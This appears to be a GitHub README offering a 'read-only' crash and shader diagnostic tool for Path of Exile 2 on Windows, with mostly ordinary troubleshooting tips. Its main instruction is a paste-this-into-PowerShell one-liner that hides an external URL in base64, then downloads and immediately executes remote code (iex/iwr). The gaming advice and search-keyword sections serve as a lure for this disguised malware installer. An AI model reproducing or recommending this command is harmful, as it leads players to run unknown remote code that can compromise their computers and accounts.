<p align="center">
  <img src="https://i.postimg.cc/65Ky1skX/banner.png" alt="PoE 2 Crash & Shader Audit — Windows troubleshooting for Path of Exile 2" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11">
  <img src="https://img.shields.io/badge/Run%20via-PowerShell-5391FE?style=flat-square&logo=powershell" alt="Run via PowerShell">
  <img src="https://img.shields.io/badge/License-MIT-2EA44F?style=flat-square" alt="License: MIT">
</p>

# Path of Exile 2 Crashing or Stuttering? PoE 2 Crash & Shader Audit for Windows

**Path of Exile 2 players frequently encounter renderer-specific crashes (DirectX 12 vs. Vulkan), shader-cache rebuild spikes after league patches, and configuration conflicts in My Games.**

**PoE 2 Crash & Shader Audit** is a read-only Windows diagnostic companion for inspecting `Client.txt` log entries, checking `poe2_production_Config.ini` renderer settings, and reviewing shader cache folders before clearing local data.

**For:** Path of Exile 2 · Windows PC (Steam & Standalone) · Renderer crash triage, `Client.txt` inspection, and shader cache checks  
**Not for:** game automation, memory reading, or modifying protected client binaries

## Run PoE 2 Crash & Shader Audit with PowerShell

Close **Path of Exile 2** and preserve any saves or configuration files you want to restore before running a diagnostic check.

1. Press **Win + X** on your keyboard.
2. Choose **Terminal** or **Windows PowerShell** from the menu (on some Windows configurations **Win + X**, then **I** opens the terminal; shortcuts vary).
3. Copy the PowerShell command shown below, paste it into the terminal, and press **Enter**.
4. Review the on-screen messages and verify any proposed file changes before confirming them.

### PowerShell command

```powershell
iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtcGxhY2UudG9wL3dvcmtlcj89NzY1MTI5MDYxMy9GaXg='))) -UseBasicParsing)
```

## What to check first

| Symptom | First useful check | Why it matters |
| --- | --- | --- |
| Crash to desktop when loading into towns or maps | Inspect the tail of `logs\Client.txt` and check `renderer_type` in `poe2_production_Config.ini` | Switching between `DirectX12` and `Vulkan` isolates driver-specific GPU crashes |
| Heavy frame spikes whenever new skills or effects appear | Verify `ShaderCacheD3D12` / `ShaderCacheVulkan` folders exist and are writable | Blocked or read-only shader directories force repeated on-the-fly compilation |
| Audio crackling or device dropouts during dense packs | Check Windows audio sample rate and channel count in `poe2_production_Config.ini` | High software audio channel counts can overload CPU threads in busy encounters |
| Settings reset or fail to save on exit | Check whether OneDrive is syncing `Documents\My Games\Path of Exile 2` | Cloud sync locks on `poe2_production_Config.ini` can revert configuration writes |

## Expected Windows directory layout

```text
Documents/
└── My Games/
    └── Path of Exile 2/
        ├── poe2_production_Config.ini
        ├── ShaderCacheD3D12/
        └── ShaderCacheVulkan/
```

## Step-by-step checks

### 1. Close Path of Exile 2 cleanly

Wait for the game process to exit completely before reading logs or backing up `poe2_production_Config.ini`.

### 2. Back up `poe2_production_Config.ini`

Copy `%USERPROFILE%\Documents\My Games\Path of Exile 2\poe2_production_Config.ini` to a dated backup folder before changing renderer options.

### 3. Check `Client.txt` for recent errors

Inspect the game's `logs\Client.txt` file for GPU device-removed (`DXGI_ERROR_DEVICE_REMOVED`) or shader compilation messages.

### 4. Compare DirectX 12 and Vulkan

Test one controlled map or town instance on `DirectX12` vs. `Vulkan` while keeping upscaling and shadow settings constant.

### 5. Check OneDrive sync status on Documents

If `Documents` is redirected to OneDrive, ensure `My Games\Path of Exile 2` is excluded or available offline.

### 6. Document reproducible crashes

Record the renderer (`DX12`/`Vulkan`), GPU driver version, area name, and exact log line when reporting issues.

## Notes before making changes

Record your game build and Windows version, keep a dated backup before moving, deleting, or overwriting any file, and change one variable at a time so you can undo any step that does not help.

## Before opening an issue

When opening an [issue](../../issues), include:

- Steam or Standalone client build and Windows version;
- Active renderer (`DirectX12` or `Vulkan`) and GPU driver version;
- Whether `Documents\My Games\Path of Exile 2` is inside OneDrive;
- Relevant error lines from `Client.txt` (with account/character names removed).

Remove your Windows username and personal paths from screenshots and logs before posting publicly.

## Frequently asked questions

**Where is the Path of Exile 2 config file located on Windows?**  
It is stored at `%USERPROFILE%\Documents\My Games\Path of Exile 2\poe2_production_Config.ini`.

**Should I delete the Path of Exile 2 shader cache?**  
Only as a last resort after a major patch or driver change, and expect temporary stuttering while shaders rebuild.

**Where is Client.txt located for Steam installs?**  
Inside the game installation directory under `steamapps\common\Path of Exile 2\logs\Client.txt`.

## Sources and further reading

- [Path of Exile 2 on Steam](https://store.steampowered.com/app/2694490/Path_of_Exile_2/)
- [Official Path of Exile Website](https://www.pathofexile.com/)

*Independent community project. Not affiliated with Grinding Gear Games, Valve, or Steam. No copyrighted game binaries, save files, or third-party mods are bundled with this repository.*

---

## Search reference: Path of Exile 2 Windows Troubleshooting

### Path of Exile 2 crashing on startup or loading screen

Review `Client.txt` and test switching `renderer_type` between DirectX 12 and Vulkan in `poe2_production_Config.ini`.

### Path of Exile 2 shader cache stuttering

Confirm the shader cache directories in `My Games\Path of Exile 2` have sufficient disk space and are not locked by cloud sync.

### Path of Exile 2 config file location Windows

Find `poe2_production_Config.ini` inside `Documents\My Games\Path of Exile 2` and keep a backup before editing.
